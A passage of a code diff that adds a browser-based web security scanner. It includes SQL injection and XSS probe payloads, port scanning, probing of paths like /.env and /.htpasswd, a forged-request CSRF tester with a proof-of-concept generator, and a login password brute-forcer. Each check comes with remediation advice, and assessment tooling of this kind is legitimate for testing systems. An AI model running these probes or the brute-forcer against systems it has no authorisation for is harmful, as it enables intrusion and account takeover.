+          else if(ssLax){Lrisk('s-out','  ⚠️ SameSite: Lax — partial CSRF protection','LOW','warn');}
+          else if(ssNone){Lrisk('s-out','  🚨 SameSite: None — sent on ALL cross-site requests (CSRF risk)','HIGH','err');}
+          else{Lrisk('s-out','  🚨 SameSite: NOT SET — vulnerable to CSRF attacks','HIGH','err');L('s-out','     → FIX: Add SameSite=Strict or SameSite=Lax to cookie','dim');}
+        }
+      }
+    }catch(e){L('s-out','⚠️ Cookie check: '+e.message,'warn');}
+    SEP('s-out');
+  }
+  prog('s',46);if(stopped)return fin('s-out');
+
+  // ── 4. CORS
+  if(document.getElementById('c-cors').checked){
+    L('s-out','[CORS Policy Check]','info');
+    try{
+      const r=await fetch(url,{headers:{'Origin':'https://evil-attacker.com'},signal:AbortSignal.timeout(8000)});
+      const acao=r.headers.get('access-control-allow-origin');
+      const acac=r.headers.get('access-control-allow-credentials');
+      const acam=r.headers.get('access-control-allow-methods');
+      if(!acao){
+        Lrisk('s-out','✅ CORS: Not exposed to cross-origin requests','LOW','ok');
+      }else if(acao==='*'){
+        Lrisk('s-out','⚠️ CORS Wildcard (*): All origins can read responses','MEDIUM','warn');
+        L('s-out','   → FIX: Specify allowed origins instead of using wildcard','dim');
+      }else if(acao.includes('evil-attacker')){
+        Lrisk('s-out','🚨 CORS REFLECTS attacker origin! Cross-site requests allowed','HIGH','err');
+        if(acac==='true'){
+          Lrisk('s-out','🚨 CRITICAL: CORS + credentials=true — session hijacking possible!','CRITICAL','err');
+          L('s-out','   → FIX: Never use Access-Control-Allow-Credentials:true with wildcard or reflected origin','dim');
+        }
+      }else{
+        Lrisk('s-out','✅ CORS: Specific origin allowed ('+acao+')','LOW','ok');
+      }
+      if(acam)L('s-out','  → Allowed Methods: '+acam,'dim');
+    }catch(e){
+      L('s-out','ℹ️ CORS probe blocked by browser security policy','dim');
+    }
+    SEP('s-out');
+  }
+  prog('s',58);if(stopped)return fin('s-out');
+
+  // ── 5. SQLi
+  if(document.getElementById('c-sqli').checked){
+    L('s-out','[SQL Injection Probe]','info');
+    try{
+      const payloads=["1'","1 OR 1=1","1; DROP TABLE users--","' OR '1'='1"];
+      let found=false;
+      for(const p of payloads){
+        const testUrl=url+(url.includes('?')?'&':'?')+'id='+encodeURIComponent(p);
+        const r=await req(testUrl,{},6000);
+        const body=await r.text();
+        const errors=[
+          'You have an error in your SQL syntax',
+          'Warning: mysql_fetch','ORA-01756','Microsoft OLE DB Provider',
+          'SQLite3::query','pg_query()','SQLSTATE','Unclosed quotation mark',
+          'mysql_num_rows()','supplied argument is not a valid MySQL',
+          'Syntax error in string in query expression',
+        ];
+        const hit=errors.find(e=>body.includes(e));
+        if(hit){
+          Lrisk('s-out','🚨 SQL INJECTION DETECTED! Error: "'+hit+'"','CRITICAL','err');
+          L('s-out','   Payload: '+p,'dim');
+          L('s-out','   → FIX: Use parameterized queries / prepared statements. NEVER concatenate user input into SQL!','warn');
+          found=true;break;
+        }
+      }
+      if(!found)Lrisk('s-out','✅ SQLi: No SQL error patterns detected in response','LOW','ok');
+    }catch(e){L('s-out','⚠️ SQLi probe: '+e.message,'warn');}
+    SEP('s-out');
+  }
+  prog('s',70);if(stopped)return fin('s-out');
+
+  // ── 6. XSS
+  if(document.getElementById('c-xss').checked){
+    L('s-out','[XSS (Cross-Site Scripting) Probe]','info');
+    try{
+      const payload='<script>xss_test_9281<\/script>';
+      const encoded='&lt;script&gt;xss_test_9281&lt;/script&gt;';
+      const testUrl=url+(url.includes('?')?'&':'?')+'q='+encodeURIComponent(payload)+'&search='+encodeURIComponent(payload);
+      const r=await req(testUrl,{},6000);
+      const body=await r.text();
+      if(body.includes(payload)){
+        Lrisk('s-out','🚨 REFLECTED XSS DETECTED! Payload reflected unencoded in response','CRITICAL','err');
+        L('s-out','   → FIX: HTML-encode all user input before rendering. Use Content-Security-Policy.','warn');
+      }else if(body.includes(encoded)){
+        Lrisk('s-out','⚠️ Payload reflected but HTML-encoded — likely safe, verify CSP','MEDIUM','warn');
+      }else{
+        Lrisk('s-out','✅ XSS: Basic payload not reflected in response','LOW','ok');
+      }
+    }catch(e){L('s-out','⚠️ XSS probe: '+e.message,'warn');}
+    SEP('s-out');
+  }
+  prog('s',80);if(stopped)return fin('s-out');
+
+  // ── 7. PORT SCAN
+  if(document.getElementById('c-ports').checked){
+    L('s-out','[Port Scan]','info');
+    let host;
+    try{host=new URL(url).hostname;}catch{host=url;}
+    const ports=[
+      [80,'HTTP'],[443,'HTTPS'],[22,'SSH'],[21,'FTP'],[23,'Telnet'],
+      [3306,'MySQL'],[5432,'PostgreSQL'],[27017,'MongoDB'],[6379,'Redis'],
+      [8080,'HTTP-Alt'],[8443,'HTTPS-Alt'],[3000,'Dev Server'],[9200,'Elasticsearch'],
+      [5672,'RabbitMQ'],[2375,'Docker API (DANGEROUS)'],[6443,'Kubernetes API'],
+    ];
+    for(const[port,svc]of ports){
+      if(stopped)break;
+      try{
+        await fetch('http://'+host+':'+port,{signal:AbortSignal.timeout(1500),mode:'no-cors'});
+        const isDangerous=['SSH','FTP','Telnet','MySQL','PostgreSQL','MongoDB','Redis','Docker API (DANGEROUS)','Elasticsearch','Kubernetes API'].includes(svc);
+        if(isDangerous){
+          Lrisk('s-out','🚨 Port '+port+' ('+svc+') OPEN — exposed sensitive service!',svc==='Docker API (DANGEROUS)'?'CRITICAL':'HIGH','err');
+          L('s-out','   → FIX: Firewall port '+port+' — restrict access to trusted IPs only','dim');
+        }else{
+          Lrisk('s-out','✅ Port '+port+' ('+svc+') — Open (expected)','INFO','ok');
+        }
+      }catch(e){
+        if(e.name!=='AbortError')L('s-out','🔒 Port '+port+' ('+svc+') — Closed/Filtered','dim');
+        else L('s-out','🔒 Port '+port+' ('+svc+') — Timeout/Filtered','dim');
+      }
+    }
+    SEP('s-out');
+  }
+  prog('s',90);if(stopped)return fin('s-out');
+
+  // ── 8. SENSITIVE FILES
+  if(document.getElementById('c-files').checked){
+    L('s-out','[Sensitive File / Path Discovery]','info');
+    let base;
+    try{base=new URL(url).origin;}catch{base=url;}
+    const paths=[
+      ['/.env','Environment variables — may contain DB passwords, API keys','CRITICAL'],
+      ['/.git/config','Git repository config — source code exposure','CRITICAL'],
+      ['/.git/HEAD','Git repository exposed','HIGH'],
+      ['/wp-config.php','WordPress config — DB credentials','CRITICAL'],
+      ['/config.php','PHP config file','HIGH'],
+      ['/phpinfo.php','PHP info page — system info disclosure','HIGH'],
+      ['/admin','Admin panel','MEDIUM'],
+      ['/admin/login','Admin login page','MEDIUM'],
+      ['/phpmyadmin','phpMyAdmin — database management','HIGH'],
+      ['/robots.txt','Robots file — may reveal hidden paths','INFO'],
+      ['/sitemap.xml','Sitemap','INFO'],
+      ['/.htaccess','Apache config','MEDIUM'],
+      ['/.htpasswd','Apache password file','CRITICAL'],
+      ['/backup.zip','Backup archive','CRITICAL'],
+      ['/backup.sql','Database backup','CRITICAL'],
+      ['/web.config','IIS config','HIGH'],
+      ['/server-status','Apache server status','MEDIUM'],
+      ['/actuator','Spring Boot actuator','HIGH'],
+      ['/actuator/env','Spring env — may expose secrets','CRITICAL'],
+      ['/swagger','Swagger API docs','LOW'],
+      ['/api/swagger','Swagger API docs','LOW'],
+      ['/graphql','GraphQL endpoint','LOW'],
+    ];
+    for(const[path,desc,level]of paths){
+      if(stopped)break;
+      try{
+        const r=await req(base+path,{},5000);
+        if(r.status===200){
+          Lrisk('s-out','🚨 FOUND (200): '+base+path+' — '+desc,level,'err');
+          L('s-out','   → FIX: Remove or restrict access to this file/path','dim');
+        }else if(r.status===403){
+          Lrisk('s-out','⚠️ FORBIDDEN (403): '+path+' — exists but access denied','LOW','warn');
+        }else if(r.status===401){
+          Lrisk('s-out','⚠️ AUTH REQUIRED (401): '+path+' — protected endpoint detected','LOW','warn');
+        }else{
+          L('s-out','  ✅ Not found ('+r.status+'): '+path,'dim');
+        }
+      }catch(e){
+        L('s-out','  ✅ Not reachable: '+path,'dim');
+      }
+    }
+  }
+  prog('s',100);
+  fin('s-out');
+}
+function fin(id){
+  SEP(id);
+  L(id,'✅ Scan complete. Check CRITICAL and HIGH findings first.','ok');
+  setTimeout(()=>prog('s',0),2000);
+}
+
+// ══════════════════════════════════════════
+// HEADERS
+// ══════════════════════════════════════════
+async function doHeaders(){
+  let url=document.getElementById('h-url').value.trim();
+  if(!url){alert('Enter URL');return;}
+  url=norm(url);
+  clr('h-out');
+  L('h-out','[Headers] Fetching: '+url,'info');
+  SEP('h-out');
+  try{
+    const r=await req(url);
+    L('h-out','HTTP '+r.status+' '+r.statusText,'ok');
+    SEP('h-out');
+    const sec=['content-security-policy','x-frame-options','x-content-type-options','strict-transport-security','referrer-policy','permissions-policy'];
+    r.headers.forEach((v,k)=>{
+      const isSec=sec.includes(k.toLowerCase());
+      L('h-out','→ '+k+': '+v,isSec?'ok':'dim');
+    });
+    SEP('h-out');
+    // Analysis
+    L('h-out','[Analysis]','info');
+    const must=['content-security-policy','x-frame-options','x-content-type-options','strict-transport-security'];
+    for(const h of must){
+      if(!r.headers.get(h))L('h-out','⚠️ MISSING: '+h,'warn');
+    }
+    L('h-out','✅ Header dump complete.','ok');
+  }catch(e){L('h-out','❌ Error: '+e.message,'err');}
+}
+
+// ══════════════════════════════════════════
+// API TESTER
+// ══════════════════════════════════════════
+function authUI(){
+  const type=document.getElementById('a-authtype').value;
+  const el=document.getElementById('a-authfields');
+  if(type==='bearer'){el.innerHTML='<div class="igroup"><label>Bearer Token</label><input type="text" id="au-tok" placeholder="eyJhbGci..."></div>';}
+  else if(type==='apikey'){el.innerHTML='<div class="grid2"><div class="igroup"><label>Header Name</label><input type="text" id="au-kn" value="X-Api-Key"></div><div class="igroup"><label>Value</label><input type="text" id="au-kv" placeholder="your-api-key"></div></div>';}
+  else if(type==='basic'){el.innerHTML='<div class="grid2"><div class="igroup"><label>Username</label><input type="text" id="au-bu"></div><div class="igroup"><label>Password</label><input type="password" id="au-bp"></div></div>';}
+  else el.innerHTML='';
+}
+async function doApi(){
+  let url=document.getElementById('a-url').value.trim();
+  if(!url){alert('Enter URL');return;}
+  url=norm(url);
+  const method=document.getElementById('a-meth').value;
+  const paramsRaw=document.getElementById('a-params').value.trim();
+  const hdrsRaw=document.getElementById('a-hdrs').value.trim();
+  const bodyRaw=document.getElementById('a-body').value.trim();
+  const btype=document.querySelector('input[name="btype"]:checked')?.value||'json';
+  const authType=document.getElementById('a-authtype').value;
+  const out='a-out';
+  clr(out);
+
+  // Build query params
+  if(paramsRaw){
+    const p=new URLSearchParams();
+    paramsRaw.split('\n').forEach(l=>{
+      const i=l.indexOf('=');
+      if(i>0)p.append(l.slice(0,i).trim(),l.slice(i+1).trim());
+    });
+    url+=(url.includes('?')?'&':'?')+p.toString();
+  }
+
+  // Build headers
+  const headers={};
+  if(hdrsRaw){
+    hdrsRaw.split('\n').forEach(l=>{
+      const i=l.indexOf(':');
+      if(i>0)headers[l.slice(0,i).trim()]=l.slice(i+1).trim();
+    });
+  }
+
+  // Auth
+  if(authType==='bearer'){
+    const tok=document.getElementById('au-tok')?.value;
+    if(tok)headers['Authorization']='Bearer '+tok;
+  }else if(authType==='apikey'){
+    const kn=document.getElementById('au-kn')?.value||'X-Api-Key';
+    const kv=document.getElementById('au-kv')?.value;
+    if(kv)headers[kn]=kv;
+  }else if(authType==='basic'){
+    const bu=document.getElementById('au-bu')?.value||'';
+    const bp=document.getElementById('au-bp')?.value||'';
+    headers['Authorization']='Basic '+btoa(bu+':'+bp);
+  }
+
+  // Build request
+  const opts={method,headers};
+  if(bodyRaw&&method!=='GET'&&method!=='HEAD'){
+    opts.body=bodyRaw;
+    if(btype==='json'&&!headers['content-type'])headers['content-type']='application/json';
+    else if(btype==='form'&&!headers['content-type'])headers['content-type']='application/x-www-form-urlencoded';
+  }
+
+  L(out,'[API] '+method+' '+url,'info');
+  L(out,'Headers: '+JSON.stringify(headers),'dim');
+  SEP(out);
+
+  try{
+    const t0=Date.now();
+    const r=await req(url,opts);
+    const ms=Date.now()-t0;
+    const icon=r.status<300?'✅':r.status<400?'↪️':r.status<500?'⚠️':'🚨';
+    const cls=r.ok?'ok':r.status<500?'warn':'err';
+    L(out,icon+' HTTP '+r.status+' '+r.statusText+'  ('+ms+'ms)',cls);
+    SEP(out);
+    L(out,'[Response Headers]','info');
+    r.headers.forEach((v,k)=>L(out,'  '+k+': '+v,'dim'));
+    SEP(out);
+    L(out,'[Response Body]','info');
+    const body=await r.text();
+    try{
+      const pretty=JSON.stringify(JSON.parse(body),null,2);
+      const lines=pretty.split('\n');
+      lines.slice(0,150).forEach(l=>L(out,l,'white'));
+      if(lines.length>150)L(out,'... (truncated — '+lines.length+' total lines)','warn');
+    }catch{
+      body.split('\n').slice(0,80).forEach(l=>L(out,l,'white'));
+    }
+    SEP(out);
+    L(out,'✅ Request complete. Time: '+ms+'ms  Size: '+body.length+' bytes','ok');
+  }catch(e){L(out,'❌ Error: '+e.message,'err');}
+}
+
+// ══════════════════════════════════════════
+// CSRF
+// ══════════════════════════════════════════
+async function doCSRF(){
+  let url=document.getElementById('cs-url').value.trim();
+  if(!url){alert('Enter URL');return;}
+  url=norm(url);
+  clr('cs-out');
+  L('cs-out','[CSRF Scanner] Target: '+url,'info');
+  SEP('cs-out');
+  try{
+    const r=await req(url);
+    const html=await r.text();
+    const sc2=r.headers.get('set-cookie')||'';
+
+    // Framework detection
+    const isWF=html.includes('__VIEWSTATE');
+    const isMVC=html.includes('__RequestVerificationToken');
+    const isDjango=html.includes('csrfmiddlewaretoken');
+    const isRails=html.includes('authenticity_token');
+    const isLaravel=html.includes('_token')&&html.includes('.php');
+    const fw=isWF?'ASP.NET WebForms':isMVC?'ASP.NET MVC':isDjango?'Django':isRails?'Ruby on Rails':isLaravel?'Laravel':'Plain HTML/PHP';
+    L('cs-out','[Framework] '+fw,'purple');
+    SEP('cs-out');
+
+    // Cookie check
+    L('cs-out','[Cookie Analysis]','info');
+    if(!sc2){
+      L('cs-out','ℹ️ No Set-Cookie headers found','dim');
+    }else{
+      const lo=sc2.toLowerCase();
+      const ho=lo.includes('httponly');
+      const sec=lo.includes('secure');
+      const ssStrict=lo.includes('samesite=strict');
+      const ssLax=lo.includes('samesite=lax');
+      const ssNone=lo.includes('samesite=none');
+      L('cs-out',(ho?'✅':'🚨')+' HttpOnly: '+(ho?'Yes':'MISSING — XSS can steal session!'),ho?'ok':'err');
+      L('cs-out',(sec?'✅':'⚠️')+' Secure: '+(sec?'Yes':'MISSING — sent over HTTP too'),sec?'ok':'warn');
+      if(ssStrict)L('cs-out','✅ SameSite: Strict — best CSRF protection','ok');
+      else if(ssLax)L('cs-out','⚠️ SameSite: Lax — partial protection only','warn');
+      else if(ssNone)L('cs-out','🚨 SameSite: None — ALL cross-site requests include cookie!','err');
+      else L('cs-out','🚨 SameSite: NOT SET — CSRF attacks possible!','err');
+    }
+    SEP('cs-out');
+
+    // Form token check
+    L('cs-out','[Form CSRF Token Analysis]','info');
+    const forms=html.match(/<form[\s\S]*?<\/form>/gi)||[];
+    if(!forms.length){
+      L('cs-out','ℹ️ No HTML forms found on this page','dim');
+    }else{
+      L('cs-out','Found '+forms.length+' form(s)','info');
+      forms.forEach((form,i)=>{
+        const method=((form.match(/method=["'](\w+)["']/i)||['','GET'])[1]).toUpperCase();
+        const action=(form.match(/action=["']([^"']+)["']/i)||['',''])[1];
+        const hasTok=/csrf|xsrf|_token|requestverificationtoken|csrfmiddlewaretoken|authenticity_token|__eventvalidation/i.test(form);
+        const isPost=method==='POST';
+        L('cs-out','  Form #'+(i+1)+': '+method+' '+(action||'(same page)'),'info');
+        if(!isPost){
+          L('cs-out','    ℹ️ GET form — typically not a CSRF risk','dim');
+        }else if(hasTok){
+          L('cs-out','    ✅ CSRF token found in form','ok');
+          L('cs-out','    ⚠️ Verify token is validated server-side and unique per session','warn');
+        }else{
+          L('cs-out','    🚨 NO CSRF TOKEN in POST form — potentially vulnerable!','err');
+          L('cs-out','    → FIX: Add CSRF token to all POST forms and validate server-side','dim');
+        }
+      });
+    }
+    SEP('cs-out');
+
+    // CORS check
+    L('cs-out','[CORS Check]','info');
+    try{
+      const r2=await fetch(url,{headers:{'Origin':'https://evil-attacker.com'},signal:AbortSignal.timeout(6000)});
+      const acao=r2.headers.get('access-control-allow-origin');
+      const acac=r2.headers.get('access-control-allow-credentials');
+      if(!acao)L('cs-out','✅ CORS: Not exposed','ok');
+      else if(acao==='*')L('cs-out','⚠️ CORS Wildcard: All origins allowed','warn');
+      else if(acao.includes('evil-attacker')){
+        L('cs-out','🚨 CORS reflects attacker origin!','err');
+        if(acac==='true')L('cs-out','🚨 CRITICAL: With credentials=true — session theft possible!','err');
+      }else L('cs-out','✅ CORS: Specific origin ('+acao+')','ok');
+    }catch(e){L('cs-out','ℹ️ CORS probe blocked by browser','dim');}
+
+    SEP('cs-out');
+    L('cs-out','✅ CSRF scan complete.','ok');
+  }catch(e){L('cs-out','❌ Error: '+e.message,'err');}
+}
+
+async function doForge(){
+  let url=document.getElementById('f-url').value.trim();
+  if(!url){alert('Enter endpoint URL');return;}
+  url=norm(url);
+  const method=document.getElementById('f-meth').value;
+  const origin=document.getElementById('f-origin').value.trim();
+  const bodyRaw=document.getElementById('f-body').value.trim();
+  const out='cs-out';
+  SEP(out);
+  L(out,'[Forge] '+method+' → '+url,'orange');
+  L(out,'[Origin] Spoofing as: '+origin,'dim');
+  const pairs=bodyRaw.split('\n').filter(l=>l.includes('=')).map(l=>{const i=l.indexOf('=');return l.slice(0,i).trim()+'='+encodeURIComponent(l.slice(i+1).trim());}).join('&');
+  L(out,'[Body] '+pairs,'dim');
+  try{
+    const r=await fetch(url,{
+      method,
+      headers:{'Content-Type':'application/x-www-form-urlencoded','Origin':origin,'Referer':origin+'/csrf-poc.html'},
+      body:method!=='GET'?pairs:undefined,
+      signal:AbortSignal.timeout(8000)
+    });
+    const code=r.status;
+    if(code===403||code===401){
+      L(out,'✅ HTTP '+code+' — Server REJECTED forged request (CSRF protection active)','ok');
+    }else if(code===500){
+      L(out,'⚠️ HTTP 500 — Server error (ASP.NET ViewState/EventValidation mismatch — protected)','warn');
+    }else if(code>=200&&code<300){
+      L(out,'🚨 HTTP '+code+' — Server ACCEPTED forged request! Possible CSRF vulnerability!','err');
+    }else{
+      L(out,'↪️ HTTP '+code+' '+r.statusText,'warn');
+    }
+    r.headers.forEach((v,k)=>L(out,'  '+k+': '+v,'dim'));
+  }catch(e){L(out,'❌ Error: '+e.message,'err');}
+}
+
+function doPoc(){
+  const url=norm(document.getElementById('f-url').value.trim()||'https://target.example.com');
+  const method=document.getElementById('f-meth').value;
+  const bodyRaw=document.getElementById('f-body').value.trim();
+  const fields=bodyRaw.split('\n').filter(l=>l.includes('=')).map(l=>{
+    const i=l.indexOf('=');
+    return '    <input type="hidden" name="'+l.slice(0,i).trim()+'" value="'+l.slice(i+1).trim()+'">';
+  }).join('\n');
+  const poc=`<!DOCTYPE html>
+<html>
+<head><title>CSRF PoC — ThreatScanner</title></head>
+<body>
+<h1>CSRF Proof-of-Concept</h1>
+<p>Target: <b>${url}</b></p>
+<form action="${url}" method="${method}" id="csrfForm">
+${fields}
+  <input type="submit" value="Click me">
+</form>
+<!-- Auto-submit: document.getElementById('csrfForm').submit(); -->
+</body></html>`;
+  const blob=new Blob([poc],{type:'text/html'});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob);
+  a.download='csrf_poc.html';
+  a.click();
+  L('cs-out','✅ PoC HTML saved.','ok');
+}
+
+// ══════════════════════════════════════════
+// SUBDOMAIN
+// ══════════════════════════════════════════
+async function doSub(){
+  let domain=document.getElementById('sd-domain').value.trim()
+    .replace(/^https?:\/\//,'').replace(/\/.*/,'').toLowerCase();
+  if(!domain){alert('Enter domain');return;}
+  stopped=false;
+  clr('sd-out');
+  sdCounts={found:0,live:0,dead:0};
+  document.getElementById('sd-n1').textContent='0';
+  document.getElementById('sd-n2').textContent='0';
+  document.getElementById('sd-n3').textContent='0';
+  const updSD=()=>{
+    document.getElementById('sd-n1').textContent=sdCounts.found;
+    document.getElementById('sd-n2').textContent=sdCounts.live;
+    document.getElementById('sd-n3').textContent=sdCounts.dead;
+  };
+
+  L('sd-out','[Subdomain Scanner] Target: '+domain,'info');
+  SEP('sd-out');
+  const seen=new Set();
+
+  // crt.sh
+  if(document.getElementById('sd-crt').checked&&!stopped){
+    L('sd-out','[crt.sh] Querying Certificate Transparency logs...','info');
+    try{
+      const r=await fetch('https://crt.sh/?q=%25.'+encodeURIComponent(domain)+'&output=json',{signal:AbortSignal.timeout(20000)});
+      if(r.ok){
+        const data=await r.json();
+        let added=0;
+        for(const e of data){
+          for(const n of(e.name_value||'').split('\n')){
+            let c=n.trim().toLowerCase().replace(/^\*\./,'');
+            if((c.endsWith('.'+domain)||c===domain)&&!seen.has(c)){
+              seen.add(c);sdCounts.found++;added++;updSD();
+              L('sd-out','  ✅ '+c,'ok');
+            }
+          }
+        }
+        L('sd-out','[crt.sh] Complete — '+added+' subdomains found','info');
+      }else{L('sd-out','[crt.sh] HTTP '+r.status+' — unavailable','warn');}
+    }catch(e){L('sd-out','[crt.sh] Error: '+e.message,'warn');}
+    SEP('sd-out');
+  }
+
+  // CertSpotter
+  if(document.getElementById('sd-cs').checked&&!stopped){
+    L('sd-out','[CertSpotter] Querying...','info');
+    try{
+      const r=await fetch('https://api.certspotter.com/v1/issuances?domain='+encodeURIComponent(domain)+'&include_subdomains=true&expand=dns_names',{signal:AbortSignal.timeout(20000)});
+      if(r.ok){
+        const data=await r.json();
+        let added=0;
+        for(const iss of data){
+          for(const n of(iss.dns_names||[])){
+            let c=n.trim().toLowerCase().replace(/^\*\./,'');
+            if((c.endsWith('.'+domain)||c===domain)&&!seen.has(c)){
+              seen.add(c);sdCounts.found++;added++;updSD();
+              L('sd-out','  ✅ '+c,'ok');
+            }
+          }
+        }
+        L('sd-out','[CertSpotter] Complete — '+added+' new subdomains','info');
+      }else{L('sd-out','[CertSpotter] HTTP '+r.status,'warn');}
+    }catch(e){L('sd-out','[CertSpotter] Error: '+e.message,'warn');}
+    SEP('sd-out');
+  }
+
+  // Root domain
+  if(document.getElementById('sd-root').checked&&!seen.has(domain)){
+    seen.add(domain);sdCounts.found++;updSD();
+    L('sd-out','  ✅ '+domain+' (root domain)','ok');
+  }
+
+  L('sd-out','[Total] '+sdCounts.found+' unique subdomains found','purple');
+
+  // HTTP Probe
+  if(document.getElementById('sd-probe').checked&&sdCounts.found>0&&!stopped){
+    SEP('sd-out');
+    const list=[...seen];
+    L('sd-out','[Probe] Checking live HTTP status for '+Math.min(list.length,20)+' subdomains...','info');
+    for(const sub of list.slice(0,20)){
+      if(stopped)break;
+      let live=false;
+      for(const scheme of['https://','http://']){
+        try{
+          const r=await fetch(scheme+sub,{signal:AbortSignal.timeout(5000),mode:'no-cors'});
+          L('sd-out','  ✅ LIVE: '+scheme+sub,'ok');
+          sdCounts.live++;updSD();live=true;break;
+        }catch{}
+      }
+      if(!live){
+        L('sd-out','  🔒 DEAD: '+sub,'dim');
+        sdCounts.dead++;updSD();
+      }
+    }
+    if(list.length>20)L('sd-out','  ℹ️ Showing first 20 of '+list.length+' subdomains','info');
+  }
+
+  SEP('sd-out');
+  L('sd-out','✅ Subdomain scan complete. Found: '+sdCounts.found+' | Live: '+sdCounts.live+' | Dead: '+sdCounts.dead,'ok');
+}
+
+// ══════════════════════════════════════════
+// BRUTE FORCE
+// ══════════════════════════════════════════
+async function doBrute(){
+  let url=document.getElementById('b-url').value.trim();
+  if(!url){alert('Enter URL');return;}
+  url=norm(url);
+  const user=document.getElementById('b-user').value.trim();
+  const ufield=document.getElementById('b-ufield').value.trim()||'username';
+  const pfield=document.getElementById('b-pfield').value.trim()||'password';
+  const delay=parseInt(document.getElementById('b-delay').value)||500;
+  const wordsRaw=document.getElementById('b-words').value.trim();
+  const failKws=document.getElementById('b-fail').value.split(',').map(k=>k.trim().toLowerCase()).filter(k=>k);
+  const passwords=wordsRaw?wordsRaw.split('\n').map(p=>p.trim()).filter(p=>p):['admin','password','123456','admin123'];
+  stopped=false;
+  clr('b-out');
+
+  L('b-out','[BruteForce] Target: '+url,'info');
+  L('b-out','[BruteForce] Username: '+user+' (field: '+ufield+')','info');
+  L('b-out','[BruteForce] Passwords: '+passwords.length+' | Delay: '+delay+'ms','info');
+  L('b-out','[BruteForce] Failure keywords: '+failKws.join(', '),'dim');
+  SEP('b-out');
+
+  // Auto-detect login fields
+  try{
+    const probe=await req(url,{},6000);
+    const html=await probe.text();
+    const userMatch=html.match(/name=["']([^"']*(?:user|login|email|uname|usr)[^"']*?)["']/i);
+    const passMatch=html.match(/name=["']([^"']*(?:pass|pwd|password|passwd)[^"']*?)["']/i);
+    if(userMatch&&userMatch[1]!==ufield){
+      L('b-out','[AutoDetect] User field detected: '+userMatch[1],'purple');
+      document.getElementById('b-ufield').value=userMatch[1];
+    }
+    if(passMatch&&passMatch[1]!==pfield){
+      L('b-out','[AutoDetect] Pass field detected: '+passMatch[1],'purple');
+      document.getElementById('b-pfield').value=passMatch[1];
+    }
+    // ASP.NET hidden fields
+    const vsMatch=html.match(/id="__VIEWSTATE"[^>]*value="([^"]*)"/i);
+    const evMatch=html.match(/id="__EVENTVALIDATION"[^>]*value="([^"]*)"/i);
+    const etMatch=html.match(/__doPostBack\('([^']+)'/i);
+    if(vsMatch)L('b-out','[AutoDetect] ASP.NET WebForms detected — capturing ViewState','purple');
+  }catch(e){L('b-out','[AutoDetect] Probe failed: '+e.message,'warn');}
+
+  SEP('b-out');
+  let found=false;
+  for(const pwd of passwords){
+    if(stopped){L('b-out','[Stopped by user]','warn');break;}
+    try{
+      // Fresh GET to get current tokens
+      let extraFields='';
+      try{
+        const gr=await req(url,{},6000);
+        const gh=await gr.text();
+        const vs=gh.match(/name="__VIEWSTATE"[^>]*value="([^"]*)"/i);
+        const ev=gh.match(/name="__EVENTVALIDATION"[^>]*value="([^"]*)"/i);
+        const et=gh.match(/__doPostBack\('([^']+)'/i);
+        const fields={};
+        if(vs)fields['__VIEWSTATE']=vs[1];
+        if(ev)fields['__EVENTVALIDATION']=ev[1];
+        if(et){fields['__EVENTTARGET']=et[1];fields['__EVENTARGUMENT']='';}
+        for(const[k,v]of Object.entries(fields))extraFields+='&'+encodeURIComponent(k)+'='+encodeURIComponent(v);
+      }catch{}
+
+      const uField=document.getElementById('b-ufield').value.trim()||ufield;
+      const pField=document.getElementById('b-pfield').value.trim()||pfield;
+      const body=encodeURIComponent(uField)+'='+encodeURIComponent(user)+'&'+encodeURIComponent(pField)+'='+encodeURIComponent(pwd)+extraFields;
+
+      const r=await fetch(url,{
+        method:'POST',
+        headers:{
+          'Content-Type':'application/x-www-form-urlencoded',
+          'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ThreatScanner/1.0',
+          'Referer':url
+        },
+        body,
+        signal:AbortSignal.timeout(8000),
+        redirect:'manual'
+      });
+      const resBody=await r.text();
+      const lo=resBody.toLowerCase();
+      const isFail=failKws.some(k=>lo.includes(k));
+      const isSuccess=!isFail&&(r.status===302||r.status===301||(r.status===200&&(lo.includes('dashboard')||lo.includes('logout')||lo.includes('welcome')||lo.includes('signout')))&&!lo.includes('login'));
+
+      if(isSuccess){
+        L('b-out','🚨 SUCCESS! Username: '+user+' Password: '+pwd+' HTTP '+r.status,'err');
+        L('b-out','   → Credentials valid! Stop and report immediately.','warn');
+        found=true;break;
+      }else{
+        L('b-out','🔒 ['+pwd.padEnd(20,' ')+'] — Failed (HTTP '+r.status+')','dim');
+      }
+    }catch(e){
+      L('b-out','⚠️ Error on ['+pwd+']: '+e.message,'warn');
+    }
+    if(delay>0)await new Promise(res=>setTimeout(res,delay));
+  }
+  SEP('b-out');
+  if(!found)L('b-out','✅ Brute force complete — no valid credentials found in wordlist.','ok');
+  L('b-out','Total attempts: '+passwords.length,'dim');
+}
+
+// ══════════════════════════════════════════
+// ROUTER / WIFI
+// ══════════════════════════════════════════
+async function doNetInfo(){
+  clr('r-out');
+  L('r-out','[Network Info] Gathering...','info');
+  SEP('r-out');
+  try{
+    const r=await fetch('https://api.ipify.org?format=json',{signal:AbortSignal.timeout(6000)});
+    const d=await r.json();
+    L('r-out','🌐 Public IP: '+d.ip,'ok');
+  }catch{L('r-out','⚠️ Public IP: Unable to detect','warn');}
+  try{
+    const r=await fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(6000)});
+    const d=await r.json();
+    if(d.ip)L('r-out','📍 Location: '+d.city+', '+d.region+', '+d.country_name,'info');
+    if(d.org)L('r-out','🏢 ISP: '+d.org,'info');
+    if(d.timezone)L('r-out','🕐 Timezone: '+d.timezone,'info');
+  }catch{}
+  SEP('r-out');
+  L('r-out','[WebRTC Local IP Leak Test]','info');
+  try{
+    const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    pc.createDataChannel('');
+    const offer=await pc.createOffer();
+    await pc.setLocalDescription(offer);
+    await new Promise(r=>setTimeout(r,2000));
+    const sdp=pc.localDescription?.sdp||'';
+    const ips=[...new Set((sdp.match(/\b(?:192\.168|10\.\d+|172\.(?:1[6-9]|2\d|3[01]))\.\d+\.\d+\b/g)||[]))];
+    if(ips.length){
+      ips.forEach(ip=>L('r-out','⚠️ Local IP LEAKED via WebRTC: '+ip,'warn'));
+      L('r-out','   → This can expose your network even through VPN!','dim');
+    }else{
+      L('r-out','✅ No local IP leaked via WebRTC','ok');
+    }
+    pc.close();
+  }catch(e){L('r-out','ℹ️ WebRTC: '+e.message,'dim');}
+  SEP('r-out');
+  const conn=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
